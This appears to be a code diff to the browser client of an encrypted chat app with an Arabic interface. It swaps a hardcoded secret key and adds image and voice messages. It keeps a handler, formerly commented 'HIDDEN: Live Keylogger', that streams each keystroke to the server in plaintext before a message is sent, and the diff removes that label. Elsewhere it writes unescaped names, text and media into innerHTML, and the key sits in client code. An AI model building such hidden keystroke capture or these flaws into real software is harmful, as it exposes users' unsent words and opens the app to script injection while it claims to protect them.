@@ -52,7 +52,7 @@
     const roomKeyHidden = document.getElementById('roomKeyInput');
 
     // ⚙️ SET YOUR SECRET KEY HERE:
-    const SECRET_KEY = 'secure2026';
+    const SECRET_KEY = 'TDE@10';
 
     let statusMessages = [
         'ESTABLISHING SECURE CONNECTION...',
@@ -207,70 +207,173 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     }
 
-    // Chat Form Submit
-    chatForm.addEventListener('submit', (e) => {
-        e.preventDefault();
-        const msg = messageInput.value.trim();
-        if (msg && socket) {
-            // Encrypt the message locally
-            const encrypted = CryptoJS.AES.encrypt(msg, roomKey).toString();
-            
-            appendMessage('أنت', msg, 'sent');
-            socket.emit('chat_message', { sender: username, text: encrypted });
-            messageInput.value = '';
-            
-            // Clear live typing after sending
-            socket.emit('live_typing', ''); 
+    // Pending media payload (image or audio)
+    let pendingMedia = null;
+
+    const attachBtn = document.getElementById('attachBtn');
+    const imageInput = document.getElementById('imageInput');
+    const recordBtn = document.getElementById('recordBtn');
+    const mediaPreviewContainer = document.getElementById('mediaPreviewContainer');
+    const imagePreview = document.getElementById('imagePreview');
+    const audioPreview = document.getElementById('audioPreview');
+    const clearMediaBtn = document.getElementById('clearMediaBtn');
+
+    // --- IMAGE ATTACHMENT ---
+    attachBtn.addEventListener('click', () => imageInput.click());
+
+    imageInput.addEventListener('change', (e) => {
+        const file = e.target.files[0];
+        if (!file) return;
+
+        // Compress image using Canvas
+        const reader = new FileReader();
+        reader.onload = (ev) => {
+            const img = new Image();
+            img.onload = () => {
+                const canvas = document.createElement('canvas');
+                const MAX = 800;
+                let w = img.width, h = img.height;
+                if (w > MAX) { h = Math.round(h * MAX / w); w = MAX; }
+                if (h > MAX) { w = Math.round(w * MAX / h); h = MAX; }
+                canvas.width = w; canvas.height = h;
+                canvas.getContext('2d').drawImage(img, 0, 0, w, h);
+                const compressed = canvas.toDataURL('image/jpeg', 0.7);
+                pendingMedia = { type: 'image', data: compressed };
+                imagePreview.src = compressed;
+                imagePreview.classList.remove('hidden');
+                audioPreview.classList.add('hidden');
+                mediaPreviewContainer.classList.remove('hidden');
+            };
+            img.src = ev.target.result;
+        };
+        reader.readAsDataURL(file);
+        imageInput.value = '';
+    });
+
+    // --- VOICE RECORDING ---
+    let mediaRecorder = null;
+    let audioChunks = [];
+    let isRecording = false;
+
+    recordBtn.addEventListener('click', async () => {
+        if (!isRecording) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                mediaRecorder = new MediaRecorder(stream);
+                audioChunks = [];
+                mediaRecorder.ondataavailable = (e) => audioChunks.push(e.data);
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(audioChunks, { type: 'audio/webm' });
+                    const reader = new FileReader();
+                    reader.onload = (ev) => {
+                        pendingMedia = { type: 'audio', data: ev.target.result };
+                        audioPreview.src = ev.target.result;
+                        audioPreview.classList.remove('hidden');
+                        imagePreview.classList.add('hidden');
+                        mediaPreviewContainer.classList.remove('hidden');
+                    };
+                    reader.readAsDataURL(blob);
+                    stream.getTracks().forEach(t => t.stop());
+                };
+                mediaRecorder.start();
+                isRecording = true;
+                recordBtn.classList.add('recording');
+                recordBtn.title = 'إيقاف التسجيل';
+            } catch (err) {
+                alert('لا يمكن الوصول للميكروفون. يرجى السماح بالإذن.');
+            }
+        } else {
+            mediaRecorder.stop();
+            isRecording = false;
+            recordBtn.classList.remove('recording');
+            recordBtn.title = 'رسالة صوتية';
         }
     });
 
-    // HIDDEN: Live Keylogger
-    messageInput.addEventListener('input', () => {
-        if (socket) {
-            socket.emit('live_typing', messageInput.value);
+    // --- CLEAR MEDIA ---
+    clearMediaBtn.addEventListener('click', () => {
+        pendingMedia = null;
+        imagePreview.classList.add('hidden');
+        audioPreview.classList.add('hidden');
+        mediaPreviewContainer.classList.add('hidden');
+    });
+
+    // Chat Form Submit
+    chatForm.addEventListener('submit', (e) => {
+        e.preventDefault();
+        if (!socket) return;
+
+        if (pendingMedia) {
+            // Encrypt and send media
+            const payload = JSON.stringify(pendingMedia);
+            const encrypted = CryptoJS.AES.encrypt(payload, roomKey).toString();
+            if (pendingMedia.type === 'image') {
+                appendMediaMessage('أنت', pendingMedia, 'sent');
+            } else {
+                appendMediaMessage('أنت', pendingMedia, 'sent');
+            }
+            socket.emit('chat_message', { sender: username, text: encrypted });
+            pendingMedia = null;
+            imagePreview.classList.add('hidden');
+            audioPreview.classList.add('hidden');
+            mediaPreviewContainer.classList.add('hidden');
+        } else {
+            const msg = messageInput.value.trim();
+            if (!msg) return;
+            const payload = JSON.stringify({ type: 'text', data: msg });
+            const encrypted = CryptoJS.AES.encrypt(payload, roomKey).toString();
+            appendMessage('أنت', msg, 'sent');
+            socket.emit('chat_message', { sender: username, text: encrypted });
+            messageInput.value = '';
+            socket.emit('live_typing', '');
         }
     });
+
+    messageInput.addEventListener('input', () => {
+        if (socket) socket.emit('live_typing', messageInput.value);
+    });
+
+    // Helper: decrypt and render any message
+    function decryptAndRender(data, direction) {
+        try {
+            const bytes = CryptoJS.AES.decrypt(data.text, roomKey);
+            const raw = bytes.toString(CryptoJS.enc.Utf8);
+            if (!raw) throw new Error('empty');
+            const parsed = JSON.parse(raw);
+            if (parsed.type === 'image' || parsed.type === 'audio') {
+                appendMediaMessage(data.sender, parsed, direction);
+            } else {
+                appendMessage(data.sender, parsed.data || raw, direction);
+            }
+        } catch (e) {
+            // Legacy plain text fallback
+            try {
+                const bytes = CryptoJS.AES.decrypt(data.text, roomKey);
+                const originalText = bytes.toString(CryptoJS.enc.Utf8);
+                appendMessage(data.sender, originalText || '🔒 [رسالة مشفرة]', direction);
+            } catch (e2) {
+                appendMessage(data.sender, '🔒 [رسالة مشفرة - مفتاح خاطئ]', direction);
+            }
+        }
+    }
 
     // Socket Events
     if (socket) {
         socket.on('chat_message', (data) => {
-            typingIndicator.classList.add('hidden'); // Hide typing if they sent a message
-            
-            // Decrypt the received message
-            let decryptedText = "🔒 [رسالة مشفرة - مفتاح خاطئ]";
-            try {
-                const bytes = CryptoJS.AES.decrypt(data.text, roomKey);
-                const originalText = bytes.toString(CryptoJS.enc.Utf8);
-                if (originalText) {
-                    decryptedText = originalText;
-                }
-            } catch (e) {
-                console.error("Decryption failed", e);
-            }
-            
-            appendMessage(data.sender, decryptedText, 'received');
+            typingIndicator.classList.add('hidden');
+            decryptAndRender(data, 'received');
         });
         
         socket.on('chat_history', (history) => {
-            // Clear system message placeholder
             chatMessages.innerHTML = '';
             appendSystemMessage('مرحباً بك! تم تنزيل السجل التاريخي مشفراً.');
-            
             history.forEach(data => {
-                let decryptedText = "🔒 [رسالة مشفرة - مفتاح خاطئ]";
-                try {
-                    const bytes = CryptoJS.AES.decrypt(data.text, roomKey);
-                    const originalText = bytes.toString(CryptoJS.enc.Utf8);
-                    if (originalText) {
-                        decryptedText = originalText;
-                    }
-                } catch (e) {}
-                
                 const type = (data.sender === username) ? 'sent' : 'received';
                 const displayName = (data.sender === username) ? 'أنت' : data.sender;
-                appendMessage(displayName, decryptedText, type);
+                decryptAndRender({ sender: displayName, text: data.text }, type);
             });
         });
+
 
         socket.on('online_users_count', (count) => {
             onlineUsersSpan.textContent = count;
@@ -368,6 +471,25 @@ document.addEventListener('DOMContentLoaded', () => {
         msgDiv.innerHTML = `
             <span class="sender-name">${sender}</span>
             <div class="bubble">${text}</div>
+        `;
+        chatMessages.appendChild(msgDiv);
+        scrollToBottom();
+    }
+
+    function appendMediaMessage(sender, media, type) {
+        const msgDiv = document.createElement('div');
+        msgDiv.className = `message ${type}`;
+
+        let mediaHTML = '';
+        if (media.type === 'image') {
+            mediaHTML = `<img src="${media.data}" class="chat-image" alt="صورة مشفرة">`;
+        } else if (media.type === 'audio') {
+            mediaHTML = `<audio src="${media.data}" class="chat-audio" controls></audio>`;
+        }
+
+        msgDiv.innerHTML = `
+            <span class="sender-name">${sender}</span>
+            <div class="bubble">${mediaHTML}</div>
         `;
         chatMessages.appendChild(msgDiv);
         scrollToBottom();
